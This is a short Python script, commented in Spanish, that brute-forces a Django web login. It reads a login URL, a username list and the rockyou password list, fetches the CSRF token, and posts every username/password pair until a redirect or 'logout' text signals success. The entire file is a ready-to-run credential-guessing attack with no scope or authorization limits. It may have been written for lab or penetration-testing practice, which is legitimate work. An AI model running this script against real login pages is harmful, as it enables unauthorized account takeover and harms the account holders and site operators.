import requests
from bs4 import BeautifulSoup

# === CONFIGURACIÓN ===
URL_LOGIN = input("URL de login (ej: http://192.168.1.10:8000/login): ")

# === CARGAR USUARIOS Y CONTRASEÑAS ===
with open("common_usernames.txt", "r", encoding="utf-8") as f:
    USUARIOS = [line.strip() for line in f if line.strip()]

with open("rockyou.txt", "r", encoding="latin-1") as f:
    CLAVES = [line.strip() for line in f if line.strip()]

# === SESIÓN PERSISTENTE ===
session = requests.Session()

# === OBTENER TOKEN CSRF (inicial) ===
get_response = session.get(URL_LOGIN)
soup = BeautifulSoup(get_response.text, 'html.parser')

csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
if not csrf_input:
    print("❌ No se encontró el token CSRF. Asegúrate de que el formulario tenga 'csrfmiddlewaretoken'")
    exit(1)

csrf_token = csrf_input['value']
print(f"🔐 CSRF Token obtenido: {csrf_token}\n")

# === ATAQUE DE FUERZA BRUTA ===
encontrado = False

for usuario in USUARIOS:
    print(f"🧪 Probando usuario: {usuario}")

    for clave in CLAVES:
        print(f"   🔄 Intentando clave: {clave}")

        payload = {
            'username': usuario,
            'password': clave,
            'csrfmiddlewaretoken': csrf_token
        }

        headers = {
            'Referer': URL_LOGIN
        }

        response = session.post(URL_LOGIN, data=payload, headers=headers)

        # === COMPROBACIÓN DE LOGIN EXITOSO ===
        if response.status_code in [302, 303] or "logout" in response.text.lower():
            print(f"\n✅ ¡Login exitoso con usuario '{usuario}' y clave '{clave}'!\n")
            encontrado = True
            break

        if "Por favor, introduzca un nombre de usuario y una contraseña correctos" not in response.text:
            print("⚠️ Respuesta inesperada. Verifica manualmente.")

    if encontrado:
        break

if not encontrado:
    print("\n❌ No se encontró una combinación válida en el diccionario.")
